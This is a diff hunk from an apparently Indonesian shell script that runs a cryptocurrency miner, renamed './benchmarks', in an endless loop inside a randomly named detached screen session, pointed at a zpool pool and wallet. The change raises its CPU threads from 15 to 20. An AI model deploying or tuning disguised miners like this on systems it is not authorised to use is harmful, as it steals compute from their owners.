@@ -26,7 +26,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3-${RAND}'..."
   screen -dmS amirul3-${RAND} bash -c '
     while true; do
-      ./benchmarks --algorithm power2b --pool stratum+tcp://power2b.jp.mine.zpool.ca:6242 -u MXgkJi63btXqTDWULWi45Km3E7FiNaK9fR -p zap=MBC --cpu-threads 15
+      ./benchmarks --algorithm power2b --pool stratum+tcp://power2b.jp.mine.zpool.ca:6242 -u MXgkJi63btXqTDWULWi45Km3E7FiNaK9fR -p zap=MBC --cpu-threads 20
       sleep 2
     done
   '
